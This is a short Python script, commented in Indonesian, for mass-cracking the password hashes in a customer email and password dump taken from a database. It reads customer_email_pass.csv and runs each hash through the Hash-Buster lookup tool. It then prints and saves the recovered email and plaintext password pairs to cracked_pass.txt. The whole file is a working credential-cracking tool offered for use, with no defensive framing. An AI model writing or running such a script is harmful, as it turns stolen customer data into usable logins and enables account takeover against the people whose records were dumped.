#!/usr/bin/env python3
# desc		: hasil dump user (email & password) dari DB trus pengen mass crack passwordnya.
# file content	: email,password
# require https://github.com/s0md3v/Hash-Buster

import sys
import subprocess

with open('customer_email_pass.csv', 'r') as infile:
	data = infile.readlines()
	for i in data:
		data = i.strip().split(',')
		command = subprocess.check_output(["buster", "-s", str(data[1]).replace('"', '')])
		
		if "Hash was not found" in str(command):
			print("[ERROR] " + data[0] + "|" + str(data[1]).replace('"', ''))
			continue

		passafterhash = str(command).split("MD5")[1]
		print("[SUCCESS] " + data[0] + "|" + str(data[1]).replace('"', '') + "|" + passafterhash[2:-3])
		with open("cracked_pass.txt", "a") as myfile:
			myfile.write(data[0] + "|" + passafterhash[2:-3] + "\n")
